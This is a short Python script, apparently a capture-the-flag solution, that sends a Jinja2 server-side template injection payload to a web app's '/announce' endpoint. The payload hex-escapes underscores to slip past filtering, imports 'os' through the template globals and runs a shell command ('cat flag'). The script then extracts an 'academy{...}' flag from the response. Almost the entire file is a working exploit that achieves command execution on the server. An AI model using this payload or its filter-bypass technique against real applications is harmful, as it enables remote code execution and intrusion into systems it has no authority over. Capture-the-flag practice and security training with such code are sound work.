#!/bin/python3

import requests

import re

base_url = input("Please enter the URL of the page: ")

session = requests.Session()

response = session.post(
    f"{base_url}/announce",
    data= {
        "content": r"{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}",
    }
)

match = re.search(r"academy\{[^}]+\}", response.text)

if match:
    print(f"Found flag: {match.group(0)}")
else:
    print("Could not find flag.")
